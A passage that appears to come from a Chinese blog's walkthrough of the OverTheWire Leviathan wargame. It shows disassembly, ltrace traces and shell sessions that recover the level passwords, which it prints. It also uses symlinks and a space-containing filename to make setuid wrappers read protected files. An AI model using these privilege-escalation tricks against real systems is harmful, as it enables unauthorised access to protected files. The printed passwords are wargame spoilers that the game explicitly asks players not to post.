80491d8 <__do_global_dtors_aux+0x28> 80491bd: 55 push %ebp 80491be: 89 e5 mov %esp,%ebp 80491c0: 83 ec 08 sub $0x8,%esp 80491c3: e8 68 ff ff ff call 8049130 <deregister_tm_clones> 80491c8: c6 05 38 c0 04 08 01 movb $0x1,0x804c038 80491cf: c9 leave 80491d0: c3 ret 80491d1: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 80491d8: c3 ret 80491d9: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491e0 <frame_dummy>: 80491e0: f3 0f 1e fb endbr32 80491e4: eb 8a jmp 8049170 <register_tm_clones> 080491e6 <main>: 80491e6: 8d 4c 24 04 lea 0x4(%esp),%ecx 80491ea: 83 e4 f0 and $0xfffffff0,%esp 80491ed: ff 71 fc push -0x4(%ecx) 80491f0: 55 push %ebp 80491f1: 89 e5 mov %esp,%ebp 80491f3: 53 push %ebx 80491f4: 51 push %ecx 80491f5: 83 ec 20 sub $0x20,%esp 80491f8: 65 a1 14 00 00 00 mov %gs:0x14,%eax 80491fe: 89 45 f4 mov %eax,-0xc(%ebp) 8049201: 31 c0 xor %eax,%eax 8049203: c7 45 e0 73 65 78 00 movl $0x786573,-0x20(%ebp) 804920a: c7 45 ed 73 65 63 72 movl $0x72636573,-0x13(%ebp) 8049211: 66 c7 45 f1 65 74 movw $0x7465,-0xf(%ebp) 8049217: c6 45 f3 00 movb $0x0,-0xd(%ebp) 804921b: c7 45 e4 67 6f 64 00 movl $0x646f67,-0x1c(%ebp) 8049222: c7 45 e8 6c 6f 76 65 movl $0x65766f6c,-0x18(%ebp) 8049229: c6 45 ec 00 movb $0x0,-0x14(%ebp) 804922d: 83 ec 0c sub $0xc,%esp 8049230: 68 08 a0 04 08 push $0x804a008 8049235: e8 26 fe ff ff call 8049060 <printf@plt> 804923a: 83 c4 10 add $0x10,%esp 804923d: e8 2e fe ff ff call 8049070 <getchar@plt> 8049242: 88 45 dc mov %al,-0x24(%ebp) 8049245: e8 26 fe ff ff call 8049070 <getchar@plt> 804924a: 88 45 dd mov %al,-0x23(%ebp) 804924d: e8 1e fe ff ff call 8049070 <getchar@plt> 8049252: 88 45 de mov %al,-0x22(%ebp) 8049255: c6 45 df 00 movb $0x0,-0x21(%ebp) 8049259: 83 ec 08 sub $0x8,%esp 804925c: 8d 45 e0 lea -0x20(%ebp),%eax 804925f: 50 push %eax 8049260: 8d 45 dc lea -0x24(%ebp),%eax 8049263: 50 push %eax 8049264: e8 d7 fd ff ff call 8049040 <strcmp@plt> 8049269: 83 c4 10 add $0x10,%esp 804926c: 85 c0 test %eax,%eax 804926e: 75 2b jne 804929b <main+0xb5> 8049270: e8 1b fe ff ff call 8049090 <geteuid@plt> 8049275: 89 c3 mov %eax,%ebx 8049277: e8 14 fe ff ff call 8049090 <geteuid@plt> 804927c: 83 ec 08 sub $0x8,%esp 804927f: 53 push %ebx 8049280: 50 push %eax 8049281: e8 3a fe ff ff call 80490c0 <setreuid@plt> 8049286: 83 c4 10 add $0x10,%esp 8049289: 83 ec 0c sub $0xc,%esp 804928c: 68 13 a0 04 08 push $0x804a013 8049291: e8 1a fe ff ff call 80490b0 <system@plt> 8049296: 83 c4 10 add $0x10,%esp 8049299: eb 10 jmp 80492ab <main+0xc5> 804929b: 83 ec 0c sub $0xc,%esp 804929e: 68 1b a0 04 08 push $0x804a01b 80492a3: e8 f8 fd ff ff call 80490a0 <puts@plt> 80492a8: 83 c4 10 add $0x10,%esp 80492ab: b8 00 00 00 00 mov $0x0,%eax 80492b0: 8b 55 f4 mov -0xc(%ebp),%edx 80492b3: 65 2b 15 14 00 00 00 sub %gs:0x14,%edx 80492ba: 74 05 je 80492c1 <main+0xdb> 80492bc: e8 bf fd ff ff call 8049080 <__stack_chk_fail@plt> 80492c1: 8d 65 f8 lea -0x8(%ebp),%esp 80492c4: 59 pop %ecx 80492c5: 5b pop %ebx 80492c6: 5d pop %ebp 80492c7: 8d 61 fc lea -0x4(%ecx),%esp 80492ca: c3 ret Disassembly of section .fini: 080492cc <_fini>: 80492cc: f3 0f 1e fb endbr32 80492d0: 53 push %ebx 80492d1: 83 ec 08 sub $0x8,%esp 80492d4: e8 47 fe ff ff call 8049120 <__x86.get_pc_thunk.bx> 80492d9: 81 c3 27 2d 00 00 add $0x2d27,%ebx 80492df: 83 c4 08 add $0x8,%esp 80492e2: 5b pop %ebx 80492e3: c3 ret leviathan1@gibson:~$ \u5176\u4e2d\u7684 movl $0x786573,-0x20(%ebp) \u770b\u51fa\u6765\u5bc6\u7801\u662fsex \u8bf4\u597d\u7684\u53ea\u9700\u8981\u57fa\u672c\u7684linux\u547d\u4ee4\u5462\uff1f\uff1f\uff1f\u592a\u62bd\u8c61\u4e86 leviathan1@gibson:~$ ./check password: sex $ cat /etc/leviathan_pass/leviathan2 mEh5PNl10e $ \u4ed6\u4eba\u89e3\u6cd5 \u5f88\u597d\uff0c\u7136\u540e\u53bb\u7f51\u4e0a\u770b\u4e86\u4e00\u4e0b\u522b\u4eba\u7684\u7b54\u6848\uff0c\u8c8c\u4f3c\u6709\u53e6\u4e00\u4e2a\u597d\u4e1c\u897f\u53eb ltrace \u8fd9\u4e2a\u73a9\u610f\u513f\u53ef\u4ee5\u5355\u6b65\u8c03\u8bd5\uff0c\u7136\u540e\u5c31\u5f88\u7b80\u5355\u4e86 leviathan1@gibson:~$ ltrace ./check __libc_start_main(0x80491e6, 1, 0xffffd504, 0 <unfinished ...> printf(\"password: \") = 10 getchar(0xf7fbe4a0, 0xf7fd6f80, 0x786573, 0x646f67password: 123 ) = 49 getchar(0xf7fbe4a0, 0xf7fd6f31, 0x786573, 0x646f67) = 50 getchar(0xf7fbe4a0, 0xf7fd3231, 0x786573, 0x646f67) = 51 strcmp(\"123\", \"sex\") = -1 puts(\"Wrong password, Good Bye ...\"Wrong password, Good Bye ... ) = 29 +++ exited (status 0) +++ leviathan1@gibson:~$ \u8fd9\u91cc\u6709\u4e00\u4e2a\u4e2d\u6587\u7684 \u6559\u7a0b level3 \u76f4\u63a5\u8fd0\u884c\u4f1a\u63d0\u793a\u4e0d\u6210\u529f leviathan2@gibson:~$ ll total 36 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 83 root root 4096 Apr 23 18:06 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -r-sr-x--- 1 leviathan3 leviathan2 15060 Apr 23 18:04 printfile* -rw-r--r-- 1 root root 807 Jan 6 2022 .profile leviathan2@gibson:~$ file printfile printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=32c7e041842883e05808ab99c763a0fc1849b84e, for GNU/Linux 3.2.0, not stripped leviathan2@gibson:~$ printfile printfile: command not found leviathan2@gibson:~$ printfile --help printfile: command not found leviathan2@gibson:~$ ./printfile *** File Printer *** Usage: ./printfile filename leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3 You cant have that file... \u7136\u540e\u5206\u522b\u770b\u4e00\u4e0b leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan2 /bin/cat: /etc/leviathan_pass/leviathan2: Permission denied leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3 __libc_start_main(0x80491e6, 2, 0xffffd4d4, 0 <unfinished ...> access(\"/etc/leviathan_pass/leviathan3\", 4) = -1 puts(\"You cant have that file...\"You cant have that file... ) = 27 +++ exited (status 1) +++ leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3 __libc_start_main(0x80491e6, 2, 0xffffd4d4, 0 <unfinished ...> access(\"/etc/leviathan_pass/leviathan3\", 4) = -1 puts(\"You cant have that file...\"You cant have that file... ) = 27 +++ exited (status 1) +++ leviathan2@gibson:~$ ltrace ./printfile .bashrc __libc_start_main(0x80491e6, 2, 0xffffd4e4, 0 <unfinished ...> access(\".bashrc\", 4) = 0 snprintf(\"/bin/cat .bashrc\", 511, \"/bin/cat %s\", \".bashrc\") = 16 geteuid() = 12002 geteuid() = 12002 setreuid(12002, 12002) = 0 system(\"/bin/cat .bashrc\"# ~/.bashrc: executed by bash(1) for non-login shells. \u8fd9\u91cc\u7684\u903b\u8f91\u662f\uff0caccess\u51fd\u6570\u6765\u5224\u65ad\u4f60\u662f\u5426\u6709\u67d0\u4e2a\u6587\u4ef6\u7684\u6743\u9650\uff0c\u7136\u540e\u8c03\u7528cat\u8fdb\u884c\u8f93\u51fa\u3002\u56e0\u6b64\u53ef\u884c\u7684\u89e3\u91ca\u5c31\u662f\u4f7f\u7528\u6709\u7a7a\u683c\u7684\u6587\u4ef6\u540d\uff0c\u505a\u4e00\u4e2a\u8f6f\u8fde\u63a5\uff0c\u8fd9\u6837cat\u53ea\u4f1a\u8bfb\u53d6\u7b2c\u4e00\u4e2a\uff0c\u5c31\u7ed3\u675f\u4e86\u3002 leviathan2@gibson:~$ cd /tmp/ leviathan2@gibson:/tmp$ ls ls: cannot open directory '.': Permission denied leviathan2@gibson:/tmp$ mkdir hnz leviathan2@gibson:/tmp$ cd hnz leviathan2@gibson:/tmp/hnz$ ls leviathan2@gibson:/tmp/hnz$ ll total 732 drwxrwxr-x 2 leviathan2 leviathan2 4096 Jul 19 06:59 ./ drwxrwx-wt 16075 root root 741376 Jul 19 06:59 ../ leviathan2@gibson:/tmp/hnz$ touch \"file1 file2.txt\" leviathan2@gibson:/tmp/hnz$ ls file1 file2.txt leviathan2@gibson:/tmp/hnz$ ln -s /etc/leviathan_pass/leviathan3 /tmp/hnz/file1 leviathan2@gibson:/tmp/hnz$ ll total 732 drwxrwxr-x 2 leviathan2 leviathan2 4096 Jul 19 07:02 ./ drwxrwx-wt 16075 root root 741376 Jul 19 07:02 ../ lrwxrwxrwx 1 leviathan2 leviathan2 30 Jul 19 07:02 file1 -> /etc/leviathan_pass/leviathan3 -rw-rw-r-- 1 leviathan2 leviathan2 0 Jul 19 07:00 file1 file2.txt leviathan2@gibson:~$ ./printfile /tmp/hnz/\"file1 file2.txt\" Q0G8j4sakn /bin/cat: file2.txt: No such file or directory leviathan2@gibson:~$ level4 \u8fd8\u662f\u5148\u770b\u4e00\u4e0b leviathan3@gibson:~$ ./level3 Enter the password> 123 bzzzzzzzzap. WRONG leviathan3@gibson:~$ ltrace ./level3 __libc_start_main(0x80492bf, 1, 0xffffd504, 0 <unfinished ...> strcmp(\"h0no33\", \"kakaka\") = -1 printf(\"Enter the password> \") = 20 fgets(Enter the password> 1234 \"1234\\n\", 256, 0xf7e2a620) = 0xffffd2dc strcmp(\"1234\\n\", \"snlprintf\\n\") = -1 puts(\"bzzzzzzzzap. WRONG\"bzzzzzzzzap. WRONG ) = 19 +++ exited (status 0) +++ \u7136\u540e\u5c31\u662f\u76f4\u63a5\u8bfb\u53d6\u4e86\uff0c\u8fd9\u73a9\u610f\u513f\u5c31\u662f\u4e00\u63d0\u6743 leviathan3@gibson:~$ ./level3 Enter the password> snlprintf [You've got shell]! $ cat /etc/leviathan_pass/leviathan4 AgvropI4OA $ level5 \u753b\u98ce\u8d8a\u6765\u8d8a\u6b63\u5e38\u4e86 leviathan4@gibson:~/.trash$ ./bin 01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010 \u663e\u7136\u7684ascii\u7f16\u7801 echo \"01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010\" | perl -lape '$_=pack\"(B8)*\",@F' EKKlTF1Xqs level6 \u8c8c\u4f3c\u76f4\u63a5\u8f93\u51fa\u4e86level5\u7684\u5bc6\u7801 leviathan5@gibson:~$ ./leviathan5 EKKlTF1Xqs \u770b\u8d77\u6765\u6709\u4e2a\u53eblog\u7684\u5f88\u6709\u7528 leviathan5@gibson:~$ ltrace ./leviathan5 __libc_start_main(0x8049206, 1, 0xffffd534, 0 <unfinished ...> fopen(\"/tmp/file.log\", \"r\") = 0 puts(\"Cannot find /tmp/file.log\"Cannot find /tmp/file.log ) = 26 exit(-1 <no return ...> +++ exited (status 255) +++ leviathan5@gibson:~$ ltrace ./leviathan5 __libc_start_main(0x8049206, 1, 0xffffd534, 0 <unfinished ...> fopen(\"/tmp/file.log\", \"r\") = 0x804d1a0 fgetc(0x804d1a0) = 'E' feof(0x804d1a0) = 0 putchar(69, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 69 fgetc(0x804d1a0) = 'K' feof(0x804d1a0) = 0 putchar(75, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 75 fgetc(0x804d1a0) = 'K' feof(0x804d1a0) = 0 putchar(75, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 75 fgetc(0x804d1a0) = 'l' feof(0x804d1a0) = 0 putchar(108, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 108 fgetc(0x804d1a0) = 'T' feof(0x804d1a0) = 0 putchar(84, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 84 fgetc(0x804d1a0) = 'F' feof(0x804d1a0) = 0 putchar(70, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 70 fgetc(0x804d1a0) = '1' feof(0x804d1a0) = 0 putchar(49, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 49 fgetc(0x804d1a0) = 'X' feof(0x804d1a0) = 0 putchar(88, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 88 fgetc(0x804d1a0) = 'q' feof(0x804d1a0) = 0 putchar(113, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 113 fgetc(0x804d1a0) = 's' feof(0x804d1a0) = 0 putchar(115, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 115 fgetc(0x804d1a0) = '\\n' feof(0x804d1a0) = 0 putchar(10, 0x804a008, 0xf7c184be, 0xf7fbe4a0EKKlTF1Xqs ) = 10 fgetc(0x804d1a0) = '\\377' feof(0x804d1a0) = 1 fclose(0x804d1a0) = 0 getuid() = 12005 setuid(12005) = 0 unlink(\"/tmp/file.log\") = 0 +++ exited (status 0) +++ leviathan5@gibson:~$ \u90a3\u8fd8\u662f\u8f6f\u8fde\u63a5\u5c31\u89e3\u51b3\u4e86 leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log leviathan5@gibson:~$ ./leviathan5 YZ55XPVk2l leviathan5@gibson:~$ level7 leviathan6@gibson:~$ ./leviathan6 usage: ./leviathan6 <4 digit code> leviathan6@gibson:~$ ltrace ./leviathan6 __libc_start_main(0x80491d6, 1, 0xffffd504, 0 <unfinished ...> printf(\"usage: %s <4 digit code>\\n\", \"./leviathan6\"usage: ./leviathan6 <4 digit code> ) = 35 exit(-1 <no return ...> +++ exited (status 255) +++ leviathan6@gibson:~$ ltrace ./leviathan6 1234 __libc_start_main(0x80491d6, 2, 0xffffd4e4, 0 <unfinished ...> atoi(0xffffd668, 0xf7fd6f80, 0xf7c184be, 0xf7fbe4a0) = 1234 puts(\"Wrong\"Wrong ) = 6 +++ exited (status 0) +++ \u5f88\u597d\uff0c\u53c8\u8981\u770b\u6c47\u7f16\u4e86 leviathan6@gibson:~$ objdump -d leviathan6 leviathan6: file format elf32-i386 Disassembly of section .init: 08049000 <_init>: 8049000: f3 0f 1e fb endbr32 8049004: 53 push %ebx 8049005: 83 ec 08 sub $0x8,%esp 8049008: e8 03 01 00 00 call 8049110 <__x86.get_pc_thunk.bx> 804900d: 81 c3 f3 2f 00 00 add $0x2ff3,%ebx 8049013: 8b 83 fc ff ff ff mov -0x4(%ebx),%eax 8049019: 85 c0 test %eax,%eax 804901b: 74 02 je 804901f <_init+0x1f> 804901d: ff d0 call *%eax 804901f: 83 c4 08 add $0x8,%esp 8049022: 5b pop %ebx 8049023: c3 ret Disassembly of section .plt: 08049030 <__libc_start_main@plt-0x10>: 8049030: ff 35 04 c0 04 08 push 0x804c004 8049036: ff 25 08 c0 04 08 jmp *0x804c008 804903c: 00 00 add %al,(%eax) ... 08049040 <__libc_start_main@plt>: 8049040: ff 25 0c c0 04 08 jmp *0x804c00c 8049046: 68 00 00 00 00 push $0x0 804904b: e9 e0 ff ff ff jmp 8049030 <_init+0x30> 08049050 <printf@plt>: 8049050: ff 25 10 c0 04 08 jmp *0x804c010 8049056: 68 08 00 00 00 push $0x8 804905b: e9 d0 ff ff ff jmp 8049030 <_init+0x30> 08049060 <geteuid@plt>: 8049060: ff 25 14 c0 04 08 jmp *0x804c014 8049066: 68 10 00 00 00 push $0x10 804906b: e9 c0 ff ff ff jmp 8049030 <_init+0x30> 08049070 <puts@plt>: 8049070: ff 25 18 c0 04 08 jmp *0x804c018 8049076: 68 18 00 00 00 push $0x18 804907b: e9 b0 ff ff ff jmp 8049030 <_init+0x30> 08049080 <system@plt>: 8049080: ff 25 1c c0 04 08 jmp *0x804c01c 8049086: 68 20 00 00 00 push $0x20 804908b: e9 a0 ff ff ff jmp 8049030 <_init+0x30> 08049090 <exit@plt>: 8049090: ff 25 20 c0 04 08 jmp *0x804c020 8049096: 68 28 00 00 00 push $0x28 804909b: e9 90 ff ff ff jmp 8049030 <_init+0x30> 080490a0 <setreuid@plt>: 80490a0: ff 25 24 c0 04 08 jmp *0x804c024 80490a6: 68 30 00 00 00 push $0x30 80490ab: e9 80 ff ff ff jmp 8049030 <_init+0x30> 080490b0 <atoi@plt>: 80490b0: ff 25 28 c0 04 08 jmp *0x804c028 80490b6: 68 38 00 00 00 push $0x38 80490bb: e9 70 ff ff ff jmp 8049030 <_init+0x30> Disassembly of section .text: 080490c0 <_start>: 80490c0: f3 0f 1e fb endbr32 80490c4: 31 ed xor %ebp,%ebp 80490c6: 5e pop %esi 80490c7: 89 e1 mov %esp,%ecx 80490c9: 83 e4 f0 and $0xfffffff0,%esp 80490cc: 50 push %eax 80490cd: 54 push %esp 80490ce: 52 push %edx 80490cf: e8 19 00 00 00 call 80490ed <_start+0x2d> 80490d4: 81 c3 2c 2f 00 00 add $0x2f2c,%ebx 80490da: 6a 00 push $0x0 80490dc: 6a 00 push $0x0 80490de: 51 push %ecx 80490df: 56 push %esi 80490e0: c7 c0 d6 91 04 08 mov $0x80491d6,%eax 80490e6: 50 push %eax 80490e7: e8 54 ff ff ff call 8049040 <__libc_start_main@plt> 80490ec: f4 hlt 80490ed: 8b 1c 24 mov (%esp),%ebx 80490f0: c3 ret 80490f1: 66 90 xchg %ax,%ax 80490f3: 66 90 xchg %ax,%ax 80490f5: 66 90 xchg %ax,%ax 80490f7: 66 90 xchg %ax,%ax 80490f9: 66 90 xchg %ax,%ax 80490fb: 66 90 xchg %ax,%ax 80490fd: 66 90 xchg %ax,%ax 80490ff: 90 nop 08049100 <_dl_relocate_static_pie>: 8049100: f3 0f 1e fb endbr32 8049104: c3 ret 8049105: 66 90 xchg %ax,%ax 8049107: 66 90 xchg %ax,%ax 8049109: 66 90 xchg %ax,%ax 804910b: 66 90 xchg %ax,%ax 804910d: 66 90 xchg %ax,%ax 804910f: 90 nop 08049110 <__x86.get_pc_thunk.bx>: 8049110: 8b 1c 24 mov (%esp),%ebx 8049113: c3 ret 8049114: 66 90 xchg %ax,%ax 8049116: 66 90 xchg %ax,%ax 8049118: 66 90 xchg %ax,%ax 804911a: 66 90 xchg %ax,%ax 804911c: 66 90 xchg %ax,%ax 804911e: 66 90 xchg %ax,%ax 08049120 <deregister_tm_clones>: 8049120: b8 34 c0 04 08 mov $0x804c034,%eax 8049125: 3d 34 c0 04 08 cmp $0x804c034,%eax 804912a: 74 24 je 8049150 <deregister_tm_clones+0x30> 804912c: b8 00 00 00 00 mov $0x0,%eax 8049131: 85 c0 test %eax,%eax 8049133: 74 1b je 8049150 <deregister_tm_clones+0x30> 8049135: 55 push %ebp 8049136: 89 e5 mov %esp,%ebp 8049138: 83 ec 14 sub $0x14,%esp 804913b: 68 34 c0 04 08 push $0x804c034 8049140: ff d0 call *%eax 8049142: 83 c4 10 add $0x10,%esp 8049145: c9 leave 8049146: c3 ret 8049147: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804914e: 66 90 xchg %ax,%ax 8049150: c3 ret 8049151: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 8049158: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804915f: 90 nop 08049160 <register_tm_clones>: 8049160: b8 34 c0 04 08 mov $0x804c034,%eax 8049165: 2d 34 c0 04 08 sub $0x804c034,%eax 804916a: 89 c2 mov %eax,%edx 804916c: c1 e8 1f shr $0x1f,%eax 804916f: c1 fa 02 sar $0x2,%edx 8049172: 01 d0 add %edx,%eax 8049174: d1 f8 sar %eax 8049176: 74 20 je 8049198 <register_tm_clones+0x38> 8049178: ba 00 00 00 00 mov $0x0,%edx 804917d: 85 d2 test %edx,%edx 804917f: 74 17 je 8049198 <register_tm_clones+0x38> 8049181: 55 push %ebp 8049182: 89 e5 mov %esp,%ebp 8049184: 83 ec 10 sub $0x10,%esp 8049187: 50 push %eax 8049188: 68 34 c0 04 08 push $0x804c034 804918d: ff d2 call *%edx 804918f: 83 c4 10 add $0x10,%esp 8049192: c9 leave 8049193: c3 ret 8049194: 8d 74 26 00 lea 0x0(%esi,%eiz,1),%esi 8049198: c3 ret 8049199: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491a0 <__do_global_dtors_aux>: 80491a0: f3 0f 1e fb endbr32 80491a4: 80 3d 34 c0 04 08 00 cmpb $0x0,0x804c034 80491ab: 75 1b jne 80491c8 <__do_global_dtors_aux+0x28> 80491ad: 55 push %ebp 80491ae: 89 e5 mov %esp,%ebp 80491b0: 83 ec 08 sub $0x8,%esp 80491b3: e8 68 ff ff ff call 8049120 <deregister_tm_clones> 80491b8: c6 05 34 c0 04 08 01 movb $0x1,0x804c034 80491bf: c9 leave 80491c0: c3 ret 80491c1: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 80491c8: c3 ret 80491c9: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491d0 <frame_dummy>: 80491d0: f3 0f 1e fb endbr32 80491d4: eb 8a jmp 8049160 <register_tm_clones> 080491d6 <main>: 80491d6: 8d 4c 24 04 lea 0x4(%esp),%ecx 80491da: 83 e4 f0 and $0xfffffff0,%esp 80491dd: ff 71 fc push -0x4(%ecx) 80491e0: 55 push %ebp 80491e1: 89 e5 mov %esp,%ebp 80491e3: 53 push %ebx 80491e4: 51 push %ecx 80491e5: 83 ec 10 sub $0x10,%esp 80491e8: 89 c8 mov %ecx,%eax 80491ea: c7 45 f4 d3 1b 00 00 movl $0x1bd3,-0xc(%ebp) 80491f1: 83 38 02 cmpl $0x2,(%eax) 80491f4: 74 20 je 8049216 <main+0x40> 80491f6: 8b 40 04 mov 0x4(%eax),%eax 80491f9: 8b 00 mov (%eax),%eax 80491fb: 83 ec 08 sub $0x8,%esp 80491fe: 50 push %eax 80491ff: 68 08 a0 04 08 push $0x804a008 8049204: e8 47 fe ff ff call 8049050 <printf@plt> 8049209: 83 c4 10 add $0x10,%esp 804920c: 83 ec 0c sub $0xc,%esp 804920f: 6a ff push $0xffffffff 8049211: e8 7a fe ff ff call 8049090 <exit@plt> 8049216: 8b 40 04 mov 0x4(%eax),%eax 8049219: 83 c0 04 add $0x4,%eax 804921c: 8b 00 mov (%eax),%eax 804921e: 83 ec 0c sub $0xc,%esp 8049221: 50 push %eax 8049222: e8 89 fe ff ff call 80490b0 <atoi@plt> 8049227: 83 c4 10 add $0x10,%esp 804922a: 39 45 f4 cmp %eax,-0xc(%ebp) 804922d: 75 2b jne 804925a <main+0x84> 804922f: e8 2c fe ff ff call 8049060 <geteuid@plt> 8049234: 89 c3 mov %eax,%ebx 8049236: e8 25 fe ff ff call 8049060 <geteuid@plt> 804923b: 83 ec 08 sub $0x8,%esp 804923e: 53 push %ebx 804923f: 50 push %eax 8049240: e8 5b fe ff ff call 80490a0 <setreuid@plt> 8049245: 83 c4 10 add $0x10,%esp 8049248: 83 ec 0c sub $0xc,%esp 804924b: 68 22 a0 04 08 push $0x804a022 8049250: e8 2b fe ff ff call 8049080 <system@plt> 8049255: 83 c4 10 add $0x10,%esp 8049258: eb 10 jmp 804926a <main+0x94> 804925a: 83 ec 0c sub $0xc,%esp 804925d: 68 2a a0 04 08 push $0x804a02a 8049262: e8 09 fe ff ff call 8049070 <puts@plt> 8049267: 83 c4 10 add $0x10,%esp 804926a: b8 00 00 00 00 mov $0x0,%eax 804926f: 8d 65 f8 lea -0x8(%ebp),%esp 8049272: 59 pop %ecx 8049273: 5b pop %ebx 8049274: 5d pop %ebp 8049275: 8d 61 fc lea -0x4(%ecx),%esp 8049278: c3 ret Disassembly of section .fini: 0804927c <_fini>: 804927c: f3 0f 1e fb endbr32 8049280: 53 push %ebx 8049281: 83 ec 08 sub $0x8,%esp 8049284: e8 87 fe ff ff call 8049110 <__x86.get_pc_thunk.bx> 8049289: 81 c3 77 2d 00 00 add $0x2d77,%ebx 804928f: 83 c4 08 add $0x8,%esp 8049292: 5b pop %ebx 8049293: c3 ret \u8fd8\u662fmovl\u8fd9\u4e00\u53e5\u627e\u7acb\u5373\u6570 80491ea: c7 45 f4 d3 1b 00 00 movl $0x1bd3,-0xc(%ebp) 0x1bd3\u6362\u7b97\u4e00\u4e0b\u662f7123 \u7136\u540e\u5f97\u5230\u5bc6\u7801 leviathan6@gibson:~$ ./leviathan6 7123 $ cat /etc/leviathan_pass/leviathan7 8GpZ5f8Hze $ \u8fdb\u5f69\u86cb leviathan7@gibson:~$ ll total 24 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 83 root root 4096 Apr 23 18:06 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -r--r----- 1 leviathan7 leviathan7 178 Apr 23 18:05 CONGRATULATIONS -rw-r--r-- 1 root root 807 Jan 6 2022 .profile leviathan7@gibson:~$ cat CONGRATULATIONS Well Done, you seem to have used a *nix system before, now try something more serious. (Please don't post writeups, solutions or spoilers about the games on the web. Thank you!) leviathan7@gibson:~$ \u8fd9\u73a9\u610f\u513f\uff0c\u91cc\u9762\u6709\u5927\u91cf\u7684\u4e1c\u897f\u53ef\u4e0d\u662flinux\u64cd\u4f5c\u554a\uff0c\u8fd9\u91cc\u9762\u6709\u9605\u8bfb\u6c47\u7f16\u7684\u5185\u5bb9\u7684\u4e8b\u513f\uff0c\u53ef\u5e95\u5c42\u3002\u3002\u3002 \u88ab\u9a97\u7684\u5f88\u60e8\u554a\uff0c\u8fd9\u91cc\u9762\u8981\u4f1a\u7684linux\u662f\u4e0d\u662f\u6307RHCA\u90a3\u79cd\uff0c\u90a3\u53ef\u771f\u5c4c \u548b\u56de\u4e8b\u513f\uff0c\u4eba\u5bb6\u4e0d\u8ba9\u4f20\u7b54\u6848\uff0caz\uff0c\u53cd\u6b63\u6211\u6ca1\u5565\u6d41\u91cf\uff0c\u5c31\u4f20\u4e86\u5427\u3002\u3002\u3002","title":"leviathan"},{"location":"WarGame/leviathan/#level0","text":"ssh\u767b\u5f55\uff0c\u8001\u4e09\u6837\u4e86 \u250c\u2500\ud83c\udf35[myc@ubuntu22]\u2500[~] \u2514\u2500\u2500\u257c[11:00:33]$ ssh leviathan0@leviathan.labs.overthewire.org -p 2223 The authenticity of host '[leviathan.labs.overthewire.org]:2223 ([16.16.148.221]:2223)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:6: [hashed name] ~/.ssh/known_hosts:9: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '[leviathan.labs.overthewire.org]:2223' (ED25519) to the list of known hosts. _ _ _ _ | | _____ _(_) __ _| |_| |__ __ _ _ __ | |/ _ \\ \\ / / |/ _` | __| '_ \\ / _` | '_ \\ | | __/\\ V /| | (_| | |_| | | | (_| | | | | |_|\\___| \\_/ |_|\\__,_|\\__|_| |_|\\__,_|_| |_| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames leviathan0@leviathan.labs.overthewire.org's password: ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit 